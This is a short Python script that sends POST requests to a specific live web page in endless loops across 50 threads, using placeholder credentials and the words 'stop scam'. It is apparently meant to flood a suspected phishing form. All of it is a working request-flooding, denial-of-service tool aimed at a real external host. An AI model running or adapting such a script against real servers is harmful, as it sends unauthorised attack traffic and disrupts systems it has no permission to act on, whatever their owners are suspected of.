import requests
import threading
url = "https://prestashop-179074-0.cloudclusters.net/1.php"
data = {
    "Username": "stop scam",
    "Password": "stop scam",
    "Mobile": "6969696969",
}


def doreq():
    while True:
        response = requests.post(url, data=data)
        print(response)


threads = []
for i in range(50):
    t = threading.Thread(target=doreq)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
